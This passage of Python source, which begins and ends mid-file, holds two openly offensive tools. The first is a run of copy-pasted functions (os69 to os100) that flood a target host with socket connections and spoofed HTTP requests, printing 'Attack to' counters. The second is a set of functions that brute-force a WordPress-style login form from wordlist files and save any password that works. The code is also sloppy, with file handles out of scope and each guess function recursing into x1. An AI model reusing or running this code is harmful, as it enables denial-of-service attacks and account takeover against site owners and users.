def os69():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os70():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os71():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os72():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os73():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os74():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os75():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os76():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os77():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os78():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os79():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os80():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os81():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os82():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os83():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os84():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os85():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os86():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os87():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os88():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os89():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os90():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os91():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os92():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os93():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os94():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os95():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os96():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os97():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os98():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os99():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1

def os100():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(("GET/"+target+"HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global already_connected
    print("\033[91mAttack to \033[93m::\033[91m",target,":",port, " \033[93m:|:\033[91m total send \033[93m::\033[91m", already_connected)
    already_connected += 1


z=""
inurl=""
port=""
target=""


def DDoS(pt,tg):
    global port, target
    port=pt
    target=tg

def input_data(urlnya,username):
    global inurl, z
    inurl=urlnya
    z=username

def reead():
	k1=open("0.1.txt","r")
	k2=open("0.2.txt","r")
	k3=open("0.3.txt","r")
	k4=open("0.4.txt","r")
	k5=open("0.5.txt","r")
	k6=open("0.6.txt","r")
	k7=open("0.7.txt","r")
	k8=open("0.8.txt","r")
	k9=open("0.9.txt","r")
	k10=open("0.10.txt","r")
	k11=open("0.11.txt","r")
	k12=open("0.12.txt","r")
	k13=open("0.13.txt","r")
	k14=open("0.14.txt","r")
	k15=open("0.15.txt","r")
	k16=open("0.16.txt","r")
	k17=open("0.17.txt","r")
	k18=open("0.18.txt","r")
	k19=open("0.19.txt","r")
	k20=open("0.20.txt","r")
	k21=open("0.21.txt","r")
	k22=open("0.22.txt","r")
	k23=open("0.23.txt","r")
	k24=open("0.24.txt","r")
	k25=open("0.25.txt","r")
	k26=open("0.26.txt","r")
	k27=open("0.27.txt","r")
	k28=open("0.28.txt","r")
	k29=open("0.29.txt","r")
	k30=open("0.30.txt","r")
	k31=open("0.31.txt","r")
	k32=open("0.32.txt","r")
	k33=open("0.33.txt","r")
	k34=open("0.34.txt","r")
	k35=open("0.35.txt","r")
	k36=open("0.36.txt","r")
	k37=open("0.37.txt","r")
	k38=open("0.38.txt","r")
	k39=open("0.39.txt","r")
	k40=open("0.40.txt","r")
	k41=open("0.41.txt","r")
	k42=open("0.42.txt","r")
	k43=open("0.43.txt","r")
	k44=open("0.44.txt","r")
	k45=open("0.45.txt","r")
	k46=open("0.46.txt","r")
	k47=open("0.47.txt","r")
	k48=open("0.48.txt","r")
	k49=open("0.49.txt","r")
	k50=open("0.50.txt","r")
	k51=open("0.51.txt","r")
	k52=open("0.52.txt","r")
	k53=open("0.53.txt","r")
	k54=open("0.54.txt","r")
	k55=open("0.55.txt","r")
	k56=open("0.56.txt","r")
	k57=open("0.57.txt","r")
	k58=open("0.58.txt","r")
	k59=open("0.59.txt","r")
	k60=open("0.60.txt","r")
	k61=open("0.61.txt","r")
	k62=open("0.62.txt","r")
	k63=open("0.63.txt","r")
	k64=open("0.64.txt","r")
	k65=open("0.65.txt","r")
	k66=open("0.66.txt","r")
	k67=open("0.67.txt","r")
	k68=open("0.68.txt","r")
	k69=open("0.69.txt","r")
	k70=open("0.70.txt","r")
	k71=open("0.71.txt","r")
	k72=open("0.72.txt","r")
	k73=open("0.73.txt","r")
	k74=open("0.74.txt","r")
	k75=open("0.75.txt","r")
	k76=open("0.76.txt","r")
	k77=open("0.77.txt","r")
	k78=open("0.78.txt","r")
	k79=open("0.79.txt","r")
	k80=open("0.80.txt","r")
	k81=open("0.81.txt","r")
	k82=open("0.82.txt","r")
	k83=open("0.83.txt","r")
	k84=open("0.84.txt","r")
	k85=open("0.85.txt","r")
	k86=open("0.86.txt","r")
	k87=open("0.87.txt","r")
	k88=open("0.88.txt","r")
	k89=open("0.89.txt","r")
	k90=open("0.90.txt","r")
	k91=open("0.91.txt","r")
	k92=open("0.92.txt","r")
	k93=open("0.93.txt","r")
	k94=open("0.94.txt","r")
	k95=open("0.95.txt","r")
	k96=open("0.96.txt","r")
	k97=open("0.97.txt","r")
	k98=open("0.98.txt","r")
	k99=open("0.99.txt","r")
	k100=open("0.100.txt","r")
	
def x1():
    w1=k1.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x2():
    w1=k2.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x3():
    w1=k3.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x4():
    w1=k4.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x5():
    w1=k5.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x6():
    w1=k6.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x7():
    w1=k7.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x8():
    w1=k8.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x9():
    w1=k9.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x10():
    w1=k10.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x11():
    w1=k11.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x12():
    w1=k12.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x13():
    w1=k13.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x14():
    w1=k14.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x15():
    w1=k15.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
